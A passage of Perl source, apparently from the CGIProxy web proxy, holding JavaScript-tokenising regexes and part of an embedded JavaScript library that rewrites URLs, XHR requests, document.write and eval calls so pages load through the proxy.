				    "(?>(?:[^"\\]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})("?)/x ;
    $RE_JS_STRING_REMAINDER_1= qr/(?>(?:[^'\\]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})('?)/ ;
    $RE_JS_STRING_REMAINDER_2= qr/(?>(?:[^"\\]|\\$RE_JS_ESCAPE_SEQUENCE){0,5000})("?)/ ;


    # ECMAScript 5 allows an unescaped "/" inside character classes, unlike ECMAScript 3.
    #$RE_JS_REGULAR_EXPRESSION_LITERAL= qr!/(?>(?:[^\012\015*\\/]|\\[^\012\015])
    #                                          (?:[^\012\015\\/]|\\[^\012\015])*)
    #                                      /(?>$RE_JS_IDENTIFIER_PART*)
    #                                     !x ;
    $RE_JS_REGULAR_EXPRESSION_LITERAL=
	qr!/(?>(?:[^\012\015*\\/[] | \[(?:[^\\\]\012\015]|\\[^\012\015])*\] | \\[^\012\015])
	       (?:[^\012\015\\/[]  | \[(?:[^\\\]\012\015]|\\[^\012\015])*\] | \\[^\012\015])*)
	   /(?>$RE_JS_IDENTIFIER_PART*)
	  !x ;


    # NumericLiteral should come before Punctuator, to avoid parsing e.g.
    #   ".4" as "." and "4".
    # Uses $RE_JS_STRING_LITERAL_START instead of $RE_JS_STRING_LITERAL to
    #   work around Perl's long-string-literal bug.
#    $RE_JS_TOKEN= qr/$RE_JS_IDENTIFIER_NAME|$RE_JS_NUMERIC_LITERAL|$RE_JS_PUNCTUATOR|$RE_JS_STRING_LITERAL/ ;
    $RE_JS_TOKEN= qr/$RE_JS_IDENTIFIER_NAME|$RE_JS_NUMERIC_LITERAL|$RE_JS_PUNCTUATOR|$RE_JS_STRING_LITERAL_START/ ;


    # JavaScript has a parsing quirk-- to handle the ambiguity that "/" may
    #   start either a division operator or a regular expression literal, it's
    #   specified that the parser should match a division operator if it's
    #   allowed by the higher-level grammar, and otherwise match a regular
    #   expression literal.  So it provides the two goal productions below.
    #   When we use them, we'll try to guess from the context which to use.
    # These patterns aren't strictly correct, because each has the extra
    #   alternative at the end to match in case we guess wrong.  Also, we
    #   combine consecutive WhiteSpace input elements here.
    # These patterns have a quirk/hack that is important to be aware of:
    #   there's a set of parentheses surrounding the final three alternatives,
    #   and any time either pattern is used it will generate an extra
    #   backreference, and a $1 (or $2, or whatever).  This lets us know if
    #   the input element matched was a token (here counting division operators
    #   and regular expression literals as tokens), which aids our process of
    #   guessing whether a division operator is allowed as the next input (see
    #   above):  we guess based on which token it is, or leave the current
    #   guess unchanged if it's not a token.
    # Correction:  Because of Perl's long-string-literal bug, these two patterns
    #   have two extra sets of parentheses inside $RE_JS_TOKEN.
    # Note that Comment has to come before DivPunctuator to correctly parse "//".

    $RE_JS_INPUT_ELEMENT_DIV= qr/(?>$RE_JS_WHITE_SPACE+)|$RE_JS_LINE_TERMINATOR|$RE_JS_COMMENT|
				 ($RE_JS_TOKEN|$RE_JS_DIV_PUNCTUATOR|$RE_JS_REGULAR_EXPRESSION_LITERAL)/x ;

    $RE_JS_INPUT_ELEMENT_REG_EXP= qr/(?>$RE_JS_WHITE_SPACE+)|$RE_JS_LINE_TERMINATOR|$RE_JS_COMMENT|
				     ($RE_JS_TOKEN|$RE_JS_REGULAR_EXPRESSION_LITERAL|$RE_JS_DIV_PUNCTUATOR)/x ;


    # These are pseudo-productions of those input elements that can come between
    #   tokens and are (pretty much) ignored.
    # Note that each represents one item and should normally be followed by "*".
    # $RE_JS_SKIP_NO_LT excludes line terminators for where those are not allowed.
    $RE_JS_SKIP= qr/(?>$RE_JS_WHITE_SPACE+)|$RE_JS_LINE_TERMINATOR|$RE_JS_COMMENT/ ;
    $RE_JS_SKIP_NO_LT= qr/(?>$RE_JS_WHITE_SPACE+)|$RE_JS_COMMENT/ ;



}


sub return_jslib {
    my($date_header)=    &rfc1123_date($now, 0) ;
    my($expires_header)= &rfc1123_date($now+86400*7, 0) ;  # expires after a week

    # To save time, only set $JSLIB_BODY if it hasn't been set already.
    unless ($JSLIB_BODY) {

	# We must use single-quoted line delimiter ('EOF') to prevent variable
	#   interpolation, etc.  But we also have to pass some constants to it,
	#   so we concatenate a "variable" block and a "fixed" block.  The
	#   "variable" block is constant for each installation, so the library
	#   can still be cached.
	# Note that $ENCODE_DECODE_BLOCK_IN_JS is a user config setting, at top.
	my($script_name_jsq)= $ENV_SCRIPT_NAME ;
	$script_name_jsq=~ s/(["\\])/\\$1/g ;   # make safe for JS quoted string
	my($script_url_jsq)= $script_url ;
	$script_url_jsq=~ s/(["\\])/\\$1/g ;   # make safe for JS quoted string
	my($THIS_HOST_jsq)= $THIS_HOST ;
	$THIS_HOST_jsq=~ s/(["\\])/\\$1/g ;   # make safe for JS quoted string
	my($proxy_group_jsq, @pg, $all_types_js, $mime_type_id_js) ;
	@pg= @PROXY_GROUP ;
	foreach (@pg) { s/(["\\])/\\$1/g }
	$proxy_group_jsq= join(', ', map { "'$_'" } @pg) ;
	$all_types_js=    join(', ', map { "'$_'" } @ALL_TYPES) ;
	$mime_type_id_js= join(', ', map { "'$_':$MIME_TYPE_ID{$_}" } keys %MIME_TYPE_ID) ;

	$JSLIB_BODY= <<EOV . <<'EOF' ;

var _proxy_jslib_SCRIPT_NAME= "$script_name_jsq" ;
var _proxy_jslib_SCRIPT_URL= "$script_url_jsq" ;
var _proxy_jslib_THIS_HOST= "$THIS_HOST_jsq" ;
var _proxy_jslib_PROXY_GROUP= [$proxy_group_jsq] ;
var _proxy_jslib_ALL_TYPES= [$all_types_js] ;
var _proxy_jslib_MIME_TYPE_ID= {$mime_type_id_js} ;

$ENCODE_DECODE_BLOCK_IN_JS

EOV

var _proxy_jslib_browser_family ;
var _proxy_jslib_RE_FULL_PATH ;
var _proxy_jslib_url_start, _proxy_jslib_url_start_inframe, _proxy_jslib_url_start_noframe,
    _proxy_jslib_base_unframes,
    _proxy_jslib_is_in_frame, _proxy_jslib_lang, _proxy_jslib_flags, _proxy_jslib_URL, _proxy_jslib_origin ;
var _proxy_jslib_cookies_are_banned_here, _proxy_jslib_doing_insert_here, _proxy_jslib_SESSION_COOKIES_ONLY,
    _proxy_jslib_COOKIE_PATH_FOLLOWS_SPEC, _proxy_jslib_RESPECT_THREE_DOT_RULE,
    _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, _proxy_jslib_RTMP_SERVER_PORT,
    _proxy_jslib_default_script_type, _proxy_jslib_default_style_type,
    _proxy_jslib_USE_DB_FOR_COOKIES, _proxy_jslib_PROXIFY_COMMENTS, _proxy_jslib_COOKIES_FROM_DB,
    _proxy_jslib_csp, _proxy_jslib_csp_st, _proxy_jslib_csp_is_supported, _proxy_jslib_eval_ok,
    _proxy_jslib_ALERT_ON_CSP_VIOLATIONi, _proxy_jslib_TIMEOUT_MULTIPLIER ;
var _proxy_jslib_RE, _proxy_jslib_ARRAY64, _proxy_jslib_UNARRAY64 ;
var _proxy_jslib_does_write ;
var _proxy_jslib_write_buffers= [ {doc:document, has_jslib:true} ] ;
var _proxy_jslib_locations= [] ;
var _proxy_jslib_xhrwins= [] ;
var _proxy_jslib_ret ;
var _proxy_jslib_temp_counter= 1000 ;
var _proxy_jslib_current_object_classid ;
var _proxy_jslib_increments= {applets: 0, embeds: 0, forms: 0, ids: 0, layers: 0, anchors: 0, images: 0, links: 0} ;

// these must be updated when adding handled properties to _handle() or _assign()!
var _proxy_jslib_handle_properties= 'eval insertAdjacentHTML setAttribute setAttributeNode getAttribute value insertRule innerHTML outerHTML outerText src currentSrc href background lowsrc action formAction useMap longDesc cite codeBase location poster open write writeln URL url newURL oldURL referrer baseURI body parentNode toString String setInterval setTimeout cookie domain frames parent top opener protocol host hostname port pathname search setStringValue setProperty setNamedItem load execScript navigate showModalDialog showModelessDialog addImport execCommand LoadMovie getElementById getElementsByTagName appendChild replaceChild insertBefore removeChild createElement text close origin postMessage pushState replaceState localStorage sessionStorage querySelector querySelectorAll send setRequestHeader'.split(/\s+/) ;

var _proxy_jslib_assign_properties= 'background src href lowsrc action useMap longDesc cite codeBase location poster profile cssText innerHTML outerHTML outerText nodeValue protocol host hostname port pathname search cookie domain value backgroundImage content cursor listStyle listStyleImage text textContent withCredentials'.split(/\s+/) ;

var _proxy_jslib_handle_props_hash, _proxy_jslib_assign_props_hash ;


// Hack for sites that redefine core JavaScript objects.  :P
// Add more properties as needed.
//var _proxy_jslib_ORIGINAL_ARRAY= {push: Array.prototype.push} ; // for some reason this doesn't work
// This fails in MSIE, so put them in try/catch.
try { var _proxy_jslib_ORIGINAL_ARRAY_push= Array.prototype.push } catch(e) {}
try { var _proxy_jslib_ORIGINAL_WINDOW_alert= Window.prototype.alert } catch(e) {}



//---- first, the initialization functions -----------------------------

// set _proxy_jslib_URL, _proxy_jslib_url_start, _proxy_jslib_lang, _proxy_jslib_flags,
//   _proxy_jslib_is_in_frame, _proxy_jslib_url_start_inframe, _proxy_jslib_url_start_noframe
function _proxy_jslib_init() {
    _proxy_jslib_csp_is_supported= _proxy_jslib_csp_is_supported_test() ;

    _proxy_jslib_browser_family=
	    navigator.appName.match(/Netscape/i)   ? 'netscape'
	  : navigator.appName.match(/Microsoft/i)  ? 'msie'
	  : '' ;

    _proxy_jslib_set_RE() ;

    _proxy_jslib_ARRAY64=
	'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_'.split('') ;
    _proxy_jslib_UNARRAY64= {} ;
    for (var i= 0 ; i<64 ; i++) { _proxy_jslib_UNARRAY64[_proxy_jslib_ARRAY64[i]]= i }


    // initialize property-list hashes for _proxy_jslib_handle() and
    //   _proxy_jslib_assign()
    _proxy_jslib_handle_props_hash= {} ;
    for (var i= 0 ; i<_proxy_jslib_handle_properties.length ; i++)
	_proxy_jslib_handle_props_hash['p_'+_proxy_jslib_handle_properties[i]]= true ;
    _proxy_jslib_assign_props_hash= {} ;
    for (var i= 0 ; i<_proxy_jslib_assign_properties.length ; i++)
	_proxy_jslib_assign_props_hash['p_'+_proxy_jslib_assign_properties[i]]= true ;


    // Mozilla sometimes adds 'wyciwyg://' to the URL
    var URL= document.URL.replace(/^wyciwyg:\/\/\d+\//i, '') ;
 
    var u= _proxy_jslib_parse_full_url(URL) ;

    _proxy_jslib_lang=  u[1] ;
    _proxy_jslib_flags= _proxy_jslib_unpack_flags(u[2]) ;
    _proxy_jslib_URL=   u[3] ;
    _proxy_jslib_flags[6]= '' ;   // set expected type = none

    if (_proxy_jslib_PROXY_GROUP.length) {
	_proxy_jslib_url_start= _proxy_jslib_PROXY_GROUP[Math.floor(Math.random()*_proxy_jslib_PROXY_GROUP.length)]
				+'/'+u[1]+'/'+_proxy_jslib_pack_flags(_proxy_jslib_flags)+'/' ;
    } else {
	_proxy_jslib_url_start= u[0]+'/'+u[1]+'/'+_proxy_jslib_pack_flags(_proxy_jslib_flags)+'/' ;
    }
    _proxy_jslib_is_in_frame= _proxy_jslib_flags[5] ;
    _proxy_jslib_flags[5]= 1 ;    // that's the frame flag
    _proxy_jslib_url_start_inframe= u[0]+'/'+u[1]+'/'+_proxy_jslib_pack_flags(_proxy_jslib_flags)+'/' ;
    _proxy_jslib_flags[5]= 0 ;
    _proxy_jslib_url_start_noframe= u[0]+'/'+u[1]+'/'+_proxy_jslib_pack_flags(_proxy_jslib_flags)+'/' ;
    _proxy_jslib_flags[5]= _proxy_jslib_is_in_frame ;

    // this begins life as the hostname.  document.URL may not be set yet, so send URL.
    _proxy_jslib_init_domain(window, _proxy_jslib_URL) ;

    _proxy_jslib_eval_ok= _proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], "'unsafe-eval'") ;

    // call _proxy_jslib_onload() and possibly an existing window.onload()
    // make sure _proxy_jslib_onload() is called even if window.onload() fails.
    var old_onload= window.onload ;
    window.onload= function() {
		       try { if (old_onload) old_onload() } catch(e) {} ;
		       _proxy_jslib_onload() ;
		   }

//alert('end of init; _p_j_URL=\n['+_proxy_jslib_URL+']') ;
}


// set variables passed in from Perl program.
function _proxy_jslib_pass_vars(base_url, origin, cookies_are_banned_here, doing_insert_here, SESSION_COOKIES_ONLY, COOKIE_PATH_FOLLOWS_SPEC, RESPECT_THREE_DOT_RULE, ALLOW_UNPROXIFIED_SCRIPTS, RTMP_SERVER_PORT, default_script_type, default_style_type, USE_DB_FOR_COOKIES, PROXIFY_COMMENTS, ALERT_ON_CSP_VIOLATION, COOKIES_FROM_DB, TIMEOUT_MULTIPLIER, csp) {
    // create global regex that matches a full URL, needed for _proxy_jslib_parse_full_url()
    // if being run from a daemon, make this something that won't choke inside parens
    var RE_SCRIPT_NAME= (_proxy_jslib_SCRIPT_NAME!='')
		? _proxy_jslib_SCRIPT_NAME.replace(/(\W)/g, function (p) { return '\\'+p } )
		: '.{0}' ;   // because "()" in a regex may throw an error
    _proxy_jslib_RE_FULL_PATH= new RegExp('^('+RE_SCRIPT_NAME+')\\/?([^\\/]*)\\/?([^\\/]*)\\/?(.*)') ;

    // set base_ vars from base_url
    _proxy_jslib_set_base_vars(window.document, base_url) ;

    // other settings
    _proxy_jslib_origin=                    origin ;
    _proxy_jslib_cookies_are_banned_here=   cookies_are_banned_here ;
    _proxy_jslib_doing_insert_here=         doing_insert_here ;
    _proxy_jslib_SESSION_COOKIES_ONLY=      SESSION_COOKIES_ONLY ;
    _proxy_jslib_COOKIE_PATH_FOLLOWS_SPEC=  COOKIE_PATH_FOLLOWS_SPEC ;
    _proxy_jslib_RESPECT_THREE_DOT_RULE=    RESPECT_THREE_DOT_RULE ;
    _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS= ALLOW_UNPROXIFIED_SCRIPTS ;
    _proxy_jslib_USE_DB_FOR_COOKIES=        USE_DB_FOR_COOKIES ;
    _proxy_jslib_PROXIFY_COMMENTS=          PROXIFY_COMMENTS ;
    _proxy_jslib_ALERT_ON_CSP_VIOLATION=    ALERT_ON_CSP_VIOLATION ;
    _proxy_jslib_COOKIES_FROM_DB=           COOKIES_FROM_DB ;
    _proxy_jslib_TIMEOUT_MULTIPLIER=        TIMEOUT_MULTIPLIER ;
    _proxy_jslib_RTMP_SERVER_PORT=          RTMP_SERVER_PORT || 1935 ;   // jsm-- get a better solution...

    _proxy_jslib_default_script_type=      default_script_type.toLowerCase() ;
    _proxy_jslib_default_style_type=       default_style_type.toLowerCase() ;

    _proxy_jslib_csp= (csp!='')  ? eval('(' + csp + ')') || {}  : {} ;  // plain "{...}" in eval is treated as a block
    _proxy_jslib_csp_st= csp ;                       // save JSON string for later


    _proxy_jslib_init() ;
}


// lastly, do what's needed after the document fully loads
function _proxy_jslib_onload() {

    // if we're in frames, then try to update the URL in the top form
    if (_proxy_jslib_is_in_frame && (window.parent===window.top) && top._proxy_jslib_insertion_frame)
	top._proxy_jslib_insertion_frame.document.URLform.URL.value= _proxy_jslib_URL ;

}


//---- the general handler routines _proxy_jslib_handle() and _proxy_jslib_assign() ----

// This is used when the property in question IS NOT being assigned to.
function _proxy_jslib_handle (o, property, cur_val, calls_now, in_new_statement) {
    //  performance tweak
    if (typeof(property)=='number') return _handle_default() ;

    // guess when the window object is implied; this only matters with Window's
    //   properties that we handle below
    if ((o===null)  && (typeof(property)=='string') && property.match(/^(location|open|setInterval|setTimeout|frames|parent|top|opener|execScript|navigate|showModalDialog|showModelessDialog|parentWindow|String)$/) && (window[property]===cur_val)) o= window ;

    // handle eval() specially-- it (oddly) can be a property of any object
    if (property=='eval') {
	if (!_proxy_jslib_eval_ok) _proxy_jslib_throw_csp_error("disallowed eval in handle()") ;
	if ((o!=null) && (o.eval)) {
	    var oldeval= o.eval ;
	    return function (code) {
		       // return o.eval(_proxy_jslib_proxify_js(code, 0)) ;
		       var ret ;
		       o._proxy_jslib_oldeval= oldeval ;
		       ret= o._proxy_jslib_oldeval(_proxy_jslib_proxify_js(code, 0)) ;
		       delete o._proxy_jslib_oldeval ;
		       return ret ;
		   } ;
	} else {
	    if (o!=null) return undefined ;
	    var oldeval= eval ;
	    return function (code) {
		       return oldeval(_proxy_jslib_proxify_js(code, 0)) ;
		   } ;
	}
    }

    // if object is still null, merely return property value
    if (o==null) return cur_val ;


    // allow things like "if (element.insertAdjacentHTML)" to work as expected
    if (typeof(o)=='object' && !(property in o)) return void 0 ;


    // StorageList needs unique handling
    // Safari chokes here, so wrap in try/catch
    // jsm-- don't think this is correct....
//    try {
//	if ((_proxy_jslib_browser_family!='msie') && (o instanceof StorageList)) {
//	    return o[property+'.cgiproxy.'+_proxy_jslib_THIS_HOST] ;
//	}
//    } catch(e) {} ;


    // performance tweak
    if (!_proxy_jslib_handle_props_hash['p_'+property]) return _handle_default() ;


    // If object is an XML Element, don't proxify anything.  There is no
    //   explicit XMLElement type, but any Element that's not HTMLElement is
    //   an XML Element.
    // This should be cleaned up and possibly merged with _p_j_instanceof().
    if (_proxy_jslib_instanceof(o, 'Element') && !_proxy_jslib_instanceof(o, 'HTMLElement')) {
	return _handle_default() ;
    }


    // Main switch

    // note use of closures to remember the object o
    // note also that in returned functions, we use "this" if it is available;
    //   see comments above proxify_js() (Perl routine)
    // Store new windows in a list so we can insert JS later if needed.
    // Store windows instead of documents, because docs may not be created yet.

    switch (property) {

	// because some sites modify these in place, we must un-proxify these
	//   when retrieving the value.
	// for Link objects, return the object, but handle toString() below to unproxify it when needed.
	// jsm-- this will still leave Link proxified when toString() is called implicitly.
	case 'src':
	case 'href':
	case 'background':
	case 'lowsrc':
	case 'action':
	case 'formAction':
	case 'useMap':
	case 'longDesc':
	case 'cite':
	case 'codeBase':
	case 'baseURI':
	case 'poster':
	    var u= (o!=void 0) ? o[property] : cur_val ;
	    if (u==void 0) return void 0 ;
	    if (typeof u=='number') return u ;
	    if (typeof u=='function') return _handle_default() ;
	    // return unchanged if u is a non-String object
	    if (u && (typeof u=='object') && !('toLowerCase' in u)) return u ;
	    // return unchanged if o is not a Node
	    if (!_proxy_jslib_instanceof(o, 'Node')) return u ;
	    var pu= _proxy_jslib_parse_full_url(u) ;
	    if (pu==void 0) return u ;   // if it's not a URL
//if (u=='') alert('in handle, first switch; typeof, o, property, u, caller=['+typeof(o)+']['+o+']['+property+']['+u+']\n['+arguments.callee.caller.caller+']') ;
	    return pu[3] ;


	case 'location':
	    if (_proxy_jslib_instanceof(o, 'Window') || _proxy_jslib_instanceof(o, 'Document')) {
		return _proxy_jslib_dup_location(o) ;
	    } else {
		return _handle_default() ;
	    }


	case 'open':
	    if (_proxy_jslib_instanceof(o, 'XMLHttpRequest') || _proxy_jslib_instanceof(o, 'AnonXMLHttpRequest')) {
		return function(method, url, asyncflag, username, password) {
			   if (typeof o._proxy_jslib_xhrdata.win=='number')
			       o._proxy_jslib_xhrdata.win= _proxy_jslib_xhrwins[o._proxy_jslib_xhrdata.win] ;

			   // This follows the algorithm in the XMLHttpSpec version 2, section 4.71, at
			   //   http://www.w3.org/TR/XMLHttpRequest2/#the-open-method

			   url= _proxy_jslib_absolute_url(url.toString(), o._proxy_jslib_xhrdata.win.document) ;
			   if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['connect-src'], url))
			       _proxy_jslib_throw_csp_error('connect-src violation in XHR.open()') ;
			   if (this!==window) o= this ;

			   if (method.match(/^(?:CONNECT|DELETE|GET|HEAD|OPTIONS|POST|PUT|TRACE|TRACK)$/i))
			       method= method.toUpperCase() ;
			   if (method.match(/^(?:CONNECT|TRACE|TRACK)$/))
			       throw new Error('SecurityError in XMLHttpRequest.open(): method is [' + method + ']') ;

			   var xhr_base_url= url.replace(/#.*/, '') ;
			   var pu= _proxy_jslib_parse_url(xhr_base_url) ;
			   var tup= pu[2].match(/^([^:]*):?(.*)/) ;
			   var temp_user= tup[1] ;
			   var temp_pwd= tup[2] ;

			   if ( !((arguments.length==2) ? true : asyncflag) && o._proxy_jslib_xhrdata.win.document
				&& (o.timeout!=0 || o.withCredentials || o.responseType!='') )
			       throw new Error('InvalidAccessError in XMLHttpRequest.open()') ;

			   if (arguments.length>=4) {
			       if (username!=null && !_proxy_jslib_same_origin(url, o._proxy_jslib_xhrdata.origin))
				   throw new Error('InvalidAccessError in XMLHttpRequest.open()') ;
			       temp_user= username ;
			   }
			   if (arguments.length>=5) {
			       if (password!=null && !_proxy_jslib_same_origin(url, o._proxy_jslib_xhrdata.origin))
				   throw new Error('InvalidAccessError in XMLHttpRequest.open()') ;
			       temp_pwd= password ;
			   }

			   o._proxy_jslib_xhrdata.url= url ;
			   o._proxy_jslib_xhrdata.method= method ;
			   o._proxy_jslib_xhrdata.username= temp_user ;
			   o._proxy_jslib_xhrdata.password= temp_pwd ;
			   o._proxy_jslib_xhrdata.headers= {} ;

			   // proxify the URL using 'x-proxy/xhr' as the expected type
			   var flags_5= _proxy_jslib_flags[5] ;
			   var flags_6= _proxy_jslib_flags[6] ;
			   _proxy_jslib_flags[5]= 1 ;  // because of how this is used, don't insert the top form
			   _proxy_jslib_flags[6]= 'x-proxy/xhr' ;
			   var old_url_start= _proxy_jslib_url_start ;

			   try {
			       _proxy_jslib_url_start= _proxy_jslib_url_start_by_flags(_proxy_jslib_flags) ;
			       if (!_proxy_jslib_same_origin(url, o._proxy_jslib_xhrdata.origin)) {
				   url= url.replace(/\:\/\//, '/') ;   // scheme://rest -> scheme/rest
				   var origin= o._proxy_jslib_xhrdata.origin.replace(/\//g, '%2f') ;
				   var headers= '' ;
				   for (var name in o._proxy_jslib_xhrdata.headers)  headers+= name + ':' ;
				   if (headers!='') headers= headers.replace(/:$/, '') ;
				   else headers= ':' ;    // avoid empty path segment
				   var omit_credentials= o.withCredentials  ? 0  : 1 ;
				   url= _proxy_jslib_full_url('x-proxy://xhr/' + origin + '/' + headers
							    + '/' + omit_credentials + '/' + url) ;
			       } else {
				   url= _proxy_jslib_full_url(url) ;
			       }
			   } finally {
			       _proxy_jslib_url_start= old_url_start ;
			       _proxy_jslib_flags[5]= flags_5 ;
			       _proxy_jslib_flags[6]= flags_6 ;
			   }

			   // false asyncflag would make connection synchronous
			   if (arguments.length==2) {
			       return o.open(method, url) ;
			   } else {
			       o._proxy_jslib_xhrdata.sync= !asyncflag ;
			       return o.open(method, url, asyncflag, username, password) ;
			   }
		       } ;

	    } else if (_proxy_jslib_instanceof(o, 'Window')) {
		return function (url, name, features, replace) {
			   if (this!==window) o= this ;
			   var full_url= _proxy_jslib_full_url(url) ;
			   var win= o.open(full_url, name, features, replace) ;
			   if (url) _proxy_jslib_init_domain(win) ;
			   // in the absence of spec, "about:blank" domain is that of parent window
			   else win._proxy_jslib_document_domain= o._proxy_jslib_document_domain ;
			   return win ;
		       } ;

	    } else if (_proxy_jslib_instanceof(o, 'Document')) {
		return function(arg1, name, features, replace) {
			   // arg1 should default to "text/html", but it doesn't
			   //   always in Firefox, so we force it
			   if (arg1==void 0) arg1= 'text/html' ;
			   if (this!==window) o= this ;
			   if (arguments.length<=2) {
			       return o.open(arg1, name) ;
			   } else {
			       // MSIE-specific
			       return o.open(_proxy_jslib_full_url(arg1, o), name, features, replace) ;
			   }
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'send':
	    if (_proxy_jslib_instanceof(o, 'XMLHttpRequest') || _proxy_jslib_instanceof(o, 'AnonXMLHttpRequest')) {
		return function(data) {
			   // this follows the algorithm in the XMLHttpRequest 2 spec, at
			   //   http://www.w3.org/TR/XMLHttpRequest2/#the-send-method
			   var body, result ;
			   if (o._proxy_jslib_xhrdata.method.match(/^(GET|HEAD)$/)) {
			       data= null ;
			   }
			   if (arguments.length>0 && data!=null) {
			       var encoding= null ;
			       var mime_type= null ;
			       try {
				   if (data instanceof ArrayBuffer) {  // MSIE chokes on this
				       body= data ;
				   } else if (data instanceof Blob) {
				       if (data.type!='')  mime_type= data.type ;
				       body= data ;
				   } else if (_proxy_jslib_instanceof(data, 'Document')) {
				       encoding= data.charset ;
				       mime_type= 'text/html;charset=' + encoding ;
				       body= data.documentElement.innerHTML ;
				   } else if (typeof data=='string') {
				       encoding= 'UTF-8' ;
				       mime_type= 'text/plain;charset=UTF-8' ;
				       body= data ;
				   } else if (data instanceof FormData) {
				       body= data ;
				   }
			       } catch(e) {
				   body= data ;
			       }
			       if (encoding!=null && o._proxy_jslib_xhrdata.headers['content-type']) {
				   // should modify existing header, but can't
				   o._proxy_jslib_xhrdata.headers['content-type']= 
				       o._proxy_jslib_xhrdata.headers['content-type']
					   .replace(/\bcharset=[\w.$-]+/, 'charset='+encoding) ;
			       }
			       if (mime_type!=null && !o._proxy_jslib_xhrdata.headers['content-type']) {
				   o.setRequestHeader('Content-Type', mime_type) ;
				   o._proxy_jslib_xhrdata.headers['content-type']= mime_type ;
			       }
			   } else {
			       body= null ;
			   }
			   if (!o._proxy_jslib_xhrdata.sync)  o._proxy_jslib_xhrdata.upload_events_flag= 1 ;
			   o._proxy_jslib_xhrdata.error_flag= 0 ;
			   if (body=='' || body==null)  o._proxy_jslib_xhrdata.upload_complete_flag= 1 ;
			   if (o._proxy_jslib_xhrdata.sync) {
			       o._proxy_jslib_xhrdata.send_flag= 1 ;
			       o.dispatchEvent(o._proxy_jslib_xhrdata.win.document.createEvent('Event')
										  .initEvent('readystatechange', false, false)) ;
			       o.dispatchEvent(o._proxy_jslib_xhrdata.win.document.createEvent('ProgressEvent')
										  .initEvent('loadstart', false, false)) ;
			       if (!o._proxy_jslib_xhrdata.upload_complete_flag)
				   o.upload.dispatchEvent(o._proxy_jslib_xhrdata.win.document.createEvent('ProgressEvent')
											     .initEvent('loadstart', false, false)) ;
			   }
			   // this happens regardless of same/cross-origin, sync flag, etc.
			   // all request event rules are handled on the server
			   return o.send(body) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'setRequestHeader':
	    if (_proxy_jslib_instanceof(o, 'XMLHttpRequest') || _proxy_jslib_instanceof(o, 'AnonXMLHttpRequest')) {
		return function(name, value) {
			   if (name.match(/[^\x00-\xff]/))  throw new SyntaxError() ;
			   if ((''+value).match(/[^\x00-\xff]/))  throw new SyntaxError() ;

			   name= name.toLowerCase() ;
			   if (name.match(/^(?:Accept-Charset|Accept-Encoding|Access-Control-Request-Headers|Access-Control-Request-Method|Connection|Content-Length|Cookie|Cookie2|Content-Transfer-Encoding|Date|Expect|Host|Keep-Alive|Origin|Referer|TE|Trailer|Transfer-Encoding|Upgrade|User-Agent|Via)$|^(?:Proxy-|Sec-)/i))
			       return ;

			   if (name in o._proxy_jslib_xhrdata.headers) {
			       o._proxy_jslib_xhrdata.headers[name]+= ', ' + value ;
			   } else {
			       o._proxy_jslib_xhrdata.headers[name]= value ;
			   }
			   return o.setRequestHeader(name, value) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'write':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		// buffer the output by document
		// no return value
		return function () {
			   if (this!==window) o= this ;
			   for (var i= 0 ; i<arguments.length ; i++)
			       _proxy_jslib_write_via_buffer(o, arguments[i]) ;
		       } ;
	    } else {
		return _handle_default() ;
	    }
	case 'writeln':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		// buffer the output by document
		// no return value
		return function () {
			   if (this!==window) o= this ;
			   for (var i= 0 ; i<arguments.length ; i++)
			       _proxy_jslib_write_via_buffer(o, arguments[i]) ;
			   _proxy_jslib_write_via_buffer(o, '\n') ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'close':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		return function() {
			   if (this!==window) o= this ;
			   var buf, i, p ;
			   for (i in _proxy_jslib_write_buffers) {
			       if (_proxy_jslib_write_buffers[i].doc===o) {
				   buf= _proxy_jslib_write_buffers[i] ;
				   if (buf.buf==void 0) break ;
				   p= _proxy_jslib_proxify_html(buf.buf, o, !buf.has_jslib) ;
				   if (p[3]) return ;   // found frame document
//if (confirm('flushing one buffer;\nhas_jslib=['+p[2]+']\nout=['+p[0]+']'))
				   buf.buf= void 0 ;
				   buf.has_jslib= false ;
				   o.write(p[0]) ;
				   break ;
			       }
			   }
//alert('about to o.close()') ;
			   o.close() ;
//alert('ending Document.close()') ;
		       } ;
	    } else {
		return _handle_default() ;
	    }


	case 'innerHTML':
	    // only unproxify it if the object is an HTMLElement or Document
	    if ((_proxy_jslib_instanceof(o, 'HTMLElement') || _proxy_jslib_instanceof(o, 'Document'))) {
		if (is_in_script(o, property)) {
		    return _proxy_jslib_proxify_block(o[property], o.type || _proxy_jslib_default_script_type,
						      true, true) ;
		} else {
		    switch (o.tagName.toLowerCase()) {
			case 'style':  return _proxy_jslib_proxify_css(o[property], true) ;
			case 'script': return _proxy_jslib_proxify_js(o[property], void 0, void 0, void 0, true) ;
			default:       return _proxy_jslib_proxify_html(o[property], (o.ownerDocument || o), false, true)[0] ;
		    }
		}
	    } else {
		return _handle_default() ;
	    }

	case 'outerHTML':
	case 'outerText':
	    // only unproxify it if the object is an HTMLElement or Document
	    if ((_proxy_jslib_instanceof(o, 'HTMLElement') || _proxy_jslib_instanceof(o, 'Document'))) {
		return _proxy_jslib_proxify_html(o[property], (o.ownerDocument || o), false, true)[0] ;  // unproxifies
	    } else {
		return _handle_default() ;
	    }


	case 'url':
	    if (_proxy_jslib_instanceof(o, 'EventSource')) {
		var pu= _proxy_jslib_parse_full_url(o[property]) ;
		if (pu==void 0) return void 0 ;
		return pu[3] ;
	    } else {
		return _handle_default() ;
	    }

	case 'newURL':
	case 'oldURL':
	    if (_proxy_jslib_instanceof(o, 'HashChangeEvent')) {
		var pu= _proxy_jslib_parse_full_url(o[property]) ;
		if (pu==void 0) return void 0 ;
		return pu[3] ;
	    } else {
		return _handle_default() ;
	    }



	case 'getElementById':
	    if (_proxy_jslib_instanceof(o, 'Document')) {
		// Hack-- if element isn't in doc yet but is in output buffer, flush
		//   buffer and try again.
